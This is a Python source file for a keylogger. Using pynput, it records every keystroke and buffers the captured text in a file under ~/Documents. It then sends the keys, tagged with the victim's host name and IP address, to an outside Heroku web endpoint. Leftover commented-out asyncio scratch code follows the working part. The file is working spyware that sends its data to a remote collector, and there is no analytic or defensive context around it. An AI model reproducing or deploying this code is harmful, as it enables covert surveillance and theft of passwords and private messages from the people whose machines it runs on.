import imp
import time
import socket
# import asynchio

# from aiohttp import ClientSession

while True:
    try:
        from pynput.keyboard import Listener
        break
    except Exception as e: # For linux to wait for the x-server to start
        print(e, flush=True)
        time.sleep(5)
import requests, os

class KeyLogger:
    def __init__(self, buffer_size):
        self.data = []
        self.url = "https://quiet-garden-51523.herokuapp.com/log/"
        self.buffer_size = buffer_size
        with Listener(on_press=self.on_pressed, on_release=self.on_release) as l:
            l.join()

    def write(self):
        log_data = "".join(self.data)
        

        mode = 'w'
        if os.path.isfile(os.path.expanduser('~/Documents/logabdi.txt')):
            mode = 'a'



        print('before try bloc')
        
        try:
            print('in try block')
            lines = []
            with open(os.path.expanduser('~/Documents/logabdi.txt'), 'r') as f:
                lines = f.readlines()
            print(lines)
            if len(lines ) > 0 and lines[0] != ' ':
                res = self.post(lines)            
                if res.status_code != 200:
                    self.write_to_files(mode, log_data)
                    return 
            print('here')
            res = self.post([log_data])
            print(res)
            self.write_to_files('w',' ')
            
        except:
            print('in except block')
            with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
                f.write(log_data)
        print('after mass')




    def write_to_files(self, mode, line):
        with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
            f.write(line)
    
    def post(self, lines):
        res = requests.post(self.url, {
                "user": self.get_Host_name_IP(),
                'data' :" ".join(lines)})
        return res


        #send data to the internet
        # requests.post("localhost:8000", {'data' : log_data})

    def on_pressed(self, key):
        self.data.append(self.process(key))
        if len(self.data) == self.buffer_size:
            self.write()
            self.data = []

    def on_release(self, key):
        pass

    def process(self, key):
        key = str(key).replace("'", '')
        if key == 'Key.space':
            return ' '
        if 'Key' in key:
            return "\n" + key + '\n'
        return key
    def get_Host_name_IP(self):
        try:
            host_name = socket.gethostname()
            host_ip = socket.gethostbyname(host_name)
            user = f"{host_name}  {host_ip}"
            print(user)
            return user
        except:
            print("Unable to get Hostname and IP")
            return "defaultuser"


if __name__ == "__main__":
    k = KeyLogger(10)

# C:\python39\python.exe c:/Users/seabd/OneDrive/Desktop/Keylogger/keylogger.py




# import asynchio

# from aiohttp import ClientSession
#  base_url = 'http://httpbin.org'
#  async def count()
#   for I in [1,2,3,4,5]:
#   print(i)
#   await asyncio.sleep(1)
#  async def get_delay(seconds)
#   endpoint = f'/delay/{seconds}'
#   print(f'Getting with {seconds} delay … ')
#   async with ClienSession(base_url+endpoint) as session:
#    response = await response.read()
#    print(response)
#  async def main():
#   await asynchio.gather(get_delay(5),count())
#  asyncio.run(main())
#  def addTwoNumbers (x, y):
#   print(x + y)
#  addTwoNumbers (2, 5)
#  print('Okay! All finished getting.')



# with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
        #     f.write(log_data)
            
        # async def post(seconds):
        #     endpoint = f'/delay/{seconds}'
        #     print(f'Getting with {seconds} delay … ')
        #     async with ClienSession(base_url+endpoint) as session:
        #     response = await response.read()
        #     print(response)

        # async def mai():
        #     async with aiohttp.ClientSession() as session:
        #         pokemon_url = 'https://quiet-garden-51523.herokuapp.com/log/'
        #         async with session.get(pokemon_url) as resp:
        #             pokemon = await resp.json()
        #             print(pokemon)
        #             with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
        #                 f.write(pokemon)
            
        # asyncio.run(mai())